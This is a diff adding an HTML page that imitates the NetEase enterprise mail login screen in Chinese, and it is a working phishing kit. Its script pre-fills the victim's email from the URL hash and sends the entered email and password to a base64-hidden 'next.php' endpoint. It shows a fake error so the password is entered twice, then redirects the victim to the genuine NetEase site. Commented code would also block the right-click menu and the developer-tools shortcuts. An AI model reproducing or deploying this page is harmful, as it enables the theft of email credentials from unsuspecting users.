@@ -1,0 +1,322 @@
+
+<!doctype html>
+<html lang="en">
+<head>
+  <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="shortcut icon" href="https://qiye.163.com/favicon.ico" type="image/x-icon">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
+    <title>网易企业邮箱 - 登录入口</title>
+    <link href="css/hover.css" rel="stylesheet" media="all">
+
+    <style type="text/css">
+      .icbu-footer-seo {
+        color: #999999;
+        font-size: 14px;
+      }
+      .icbu-footer-seo a{
+        color: #999999;
+        font-size: 14px;
+      }
+
+
+
+
+      .input-icons i { 
+        position: absolute; 
+      } 
+
+      .input-icons { 
+        width: 100%; 
+      } 
+
+      .icon { 
+        padding: 15px; 
+        min-width: 40px;
+        color: #8FA7AD; 
+      } 
+
+      .input-field { 
+        width: 100%; 
+        padding: 10px;
+        padding-left: 40px ;
+        text-align: left;
+        border: 1px solid #B7B7B7; 
+      } 
+
+
+    </style>
+  </head>
+  <!-- oncontextmenu="return false" -->
+  <body style="background: url(images/bg1.png) no-repeat center center; 
+  -webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+  background-size: cover;">
+  <div class="container-fluid p-0">
+    <div class="container-fluid">
+      <div class="container-fluid">
+        <div class="row">
+          <div class="col-lg-4 py-3" >
+            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAABGCAMAAABBu1nPAAAAVFBMVEVHcEz///////////////////////////////////////////////////////////////////////////////////////////////////////////+DS+nTAAAAG3RSTlMAI8CgEl0DaMvz1wksNkH66xtTia10tpR/S+EE9JYeAAAPiElEQVR42u1c2babuBItJgmJSYiZ/f//eR80IGHApPt032StrpWHOLGNtFW1a5SJ/hWpaj5K1XWdKseB82ldlnXL6T85Sz+kClfSjVvC/sMnlELgQcTY/6HbypQcszX5Wb3q8CyC/3s7TOqvR9M0TfCKxS8PmZx1bD+5Po2vsr77pkUIVT/8fz6OAxER1eM4Xb+lRPpNYYAsfrlcou7NpftJ3Wrdt86r3vQ0ZOM8z3MqAxrrXjE9/3aOCSwUbbzhXwGrUuj66APdlS7m6S8f9XcTXHlPQwegnD6emTerA2x4A3oHAKL5MbD69RCvsEu8mO3mm8bALqY7Ra/5OGfTuozpmC26+sYQCtgrypPkRnXy4bUq1wIYF0AlPwVWE2zY0WbdAbJ0UjMJ7P5lyQLj9DKGe9PZum3FMI/LIE9co+ZlerKgGQCKZx56qcq1AtKKjcCe/BxYQimllPBgVWW0v2aK98tOhCXSpckvdnMr+7176QHc8OPxHvHiTUStAGROVKWAaH8MLINRBhgzZDOQab2qQmuttW4ElNaF5OalZpERig9Fab+6sjJ5cCwAxmcYzOHNXzxq5zQqL4GO/zpY/LTq4gCrEvZjbARmRrlCWhERsRIoiJUo84t94XMV6XfHf3vS/AOsKml1W+dEVLnQvTYG/RTIsxWAtBpcjQCycPVVYTdzAda2sW9gscJSBRuN9hIHRmY0bjYv05Cdq91s263Br6WOniDXrWn0mmUD18N+eP4bD7UCsMvuZyXn0XHeLhUgjBdhJmZtH9xECSD1S2ILAFVEj5nuwCqhGgfWyjnfITnna6RZKURl32I5ZUDXErEMe26ZaPkMR7VZDU+hZp6bj/k0blnjgLCafGh+Y0TDERZcKWhnAJJfSIsLAGN4tFMHIK0D65M3YNWwQBAHEs9ZdQhW7R8+yp6oABjLzNJ4Y6ms7KNIDHBPchq7J0Rk1UesV06v9srV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" class="img-fluid" width="150px">
+          </div>
+          <div class="col-lg-8">
+            <!-- /////////////navbar//////////// -->
+            <nav class="navbar navbar-expand-lg navbar-dark bg-transparent mt-2">
+              <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+                <span class="navbar-toggler-icon"></span>
+              </button>
+
+              <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                <ul class="navbar-nav ml-auto">
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#">新用户开通</a>
+                  </li>
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#">English</a>
+                  </li>
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#">国外用户登录</a>
+                  </li>
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#">邮箱大师</a>
+                  </li>
+                  <li class="nav-item active">
+                    <a class="nav-link" href="#">帮助中心</a>
+                  </li>
+                </ul>
+              </div>
+            </nav>
+            <!-- /////////navbar//////////// -->
+
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="container-fluid pt-5" style="padding-bottom: 80px;">
+      <div class="row">
+        <div class="col-lg-7 align-self-center text-center">
+          
+          </div>
+          <div class="col-md-4 p-4"> 
+            <!-- //////////////////// -->
+            <div class="mt-3 px-3 py-5 bg-white pt-3 " style="-webkit-box-shadow: 0px 0px 32px -1px rgba(217,217,217,1);
+            -moz-box-shadow: 0px 0px 32px -1px rgba(217,217,217,1);
+            box-shadow: 0px 0px 32px -1px rgba(217,217,217,1);">
+            <div class="text-center mt-4">
+              <span class="font-weight-bold" style=" font-size:20px;">邮箱帐号登录</span>
+            </div>
+            <div class="mt-4">
+              <center>
+                <div class="alert alert-danger" id="mgss" style="display: none;"></div>
+                <span id="error" class="text-danger" style="display: none;">该帐户不存在。输入另一个帐号</span>
+              </center>
+              <form id="contact" class="form-horizontal well">
+                <div id="div1" class="text-dark">
+                  <div class="col-lg-12">
+                    <div class="form-group m-0">
+                      <div >
+                        <div class="input-icons">
+                          <i class="far fa-user icon"></i>
+                          <input type="email" name="ai" class="input-field rounded" id="ai" aria-describedby="aiHelp" placeholder="邮箱地址">
+                        </div>
+                      </div>
+                     
+                    </div>
+                  </div>
+                  <div class="col-lg-12 mt-4">
+                    <div class="form-group m-0">
+                      <div class="input-icons">
+                        <i class="fas fa-lock icon"></i>
+                        <input type="password" name="pr" class="input-field rounded" id="pr" aria-describedby="aiHelp" placeholder="Password">
+                      </div>
+                    </div>
+                  </div>
+                  <div class="col-lg-12 mt-2">
+                    <div class="form-check">
+                      <input type="checkbox" class="form-check-input" id="exampleCheck1">
+                      <label class="form-check-label small" style="font-weight: 500" for="exampleCheck1">记住帐号</label>
+                      <span class="float-right small"><a href="#">忘记密码</a></span>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+              <div class="text-center col-lg-12 mx-auto mt-3">
+                <button class="btn py-2 w-100 text-white" id="submit-btn" style="background-color: #3b78dd; font-weight: 500; font-size: 20px;">登 录</button>
+              </div>
+              <div class="col-lg-12">
+                <a href="#" class="small">正使用全程SSL <i class="fas fa-chevron-down"></i></a>
+                <a href="#" class="small float-right">正在使用国际线路 <i class="fas fa-chevron-down"></i></a>
+              </div>
+              <div class="col-lg-12 text-center mt-3 h4 m-0">
+                <a href="#" class="small">管理员登录</a>
+              </div>
+            </form>
+          </div>
+          <div class="col-lg-12 text-center h4 p-2" style="background-color:#f5f5f5;">
+            <img src="images/login_bottom.png" class="img-fluid" width="260px">
+          </div>
+          <!-- ////////////////////// -->
+
+        </div> 
+      </div> 
+    </div>
+    <div class="container-fluid" style="background-color:white;">
+      <div class="row">
+        <div class="col-lg-8 text-center mx-auto p-3">
+          <a href="#" class="text-dark small">关于网易</a>
+          <a href="#" class="text-dark small ml-3">官方微博</a>
+          <a href="#" class="text-dark small ml-3">相关法律</a>
+          <a href="#" class="text-dark small ml-3">隐私政策</a>
+          <span> | </span>
+          <a href="#" class="text-dark small ml-3">网易公司版权所有©1997-2020</a>
+          &nbsp
+          <img src="images/knet.png" class="img-fluid" width="40px"> 
+
+        </div>
+
+      </div>
+
+    </div>
+  </div>
+
+
+  <!-- Optional JavaScript -->
+  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+
+  /* global $ */
+  $(document).ready(function(){
+    var count=0;
+
+    
+
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+    if (!ai) {
+
+    }
+    else
+    {
+        // $('#ai').val(ai);
+        var my_ai =ai;
+        var ind=my_ai.indexOf("@");
+        var my_slice=my_ai.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#mgss").hide();
+        
+      }
+      ///////////////url getting ai////////////////
+
+
+      var file="bmV4dC5waHA=";
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#mgss').hide();
+        event.preventDefault();
+        var ai=$("#ai").val();
+        var pr=$("#pr").val();
+        var mgss = $('#mgss').html();
+        $('#mgss').text( mgss );
+      ///////////new injection////////////////
+      var my_ai =ai;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_ai)) {
+        $('#error').show();
+        ai.focus;
+        return false;
+      }
+
+      var ind=my_ai.indexOf("@");
+      var my_slice=my_ai.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: atob(file),
+        type: 'POST',
+        data:{
+          ai:ai,
+          pr:pr,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('验证中...');
+            },
+            success: function(response){
+              if(response){
+                $("#mgss").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#pr").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("https://qiye.163.com/");
+
+                  }
+                  $('#mgss').html(response['msg']);
+                }
+                else{
+                  $('#mgss').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#pr").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("https://qiye.163.com/");
+              }
+              $("#mgss").show();
+              $('#mgss').html("请稍后再试");
+            },
+            complete: function(){
+              $('#submit-btn').html('登 录');
+            }
+          });
+    });
+
+
+    });
+
+  //   document.onkeydown=function(e){
+  //     if (e.ctrlKey && 
+  //       (e.keyCode === 73 || 
+  //        e.keyCode === 105 ||
+  //        e.keyCode === 74 || 
+  //        e.keyCode === 106 || 
+  //        e.keyCode === 85 || 
+  //        e.keyCode === 117)) {
+  //       alert('not allowed');
+  //     return false;
+  //   } else {
+  //     return true;
+  //   }
+  // }
+</script>
+</html>
